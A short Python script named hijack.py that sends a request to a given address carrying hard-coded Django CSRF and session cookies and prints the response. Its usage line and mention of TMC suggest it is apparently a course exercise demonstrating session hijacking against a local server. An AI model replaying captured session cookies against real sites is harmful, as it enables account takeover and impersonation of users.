import sys
import requests
import json


def test_session(address):
    x = requests.get(f"{address}/", cookies={
        "csrftoken":"rjw4hCVZYYOBpdw4hK1NFJyZqoAwpunW",
		"sessionid":"pbv87g0efqxjhav8gjovz19czu51oun1"
	})
    print(x.text)
    return x

# python3 ./hijack.py http://127.0.0.1:8000
def main(argv):
	address = sys.argv[1]
	print(test_session(address))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python %s address' % sys.argv[0])
	else:
		main(sys.argv)
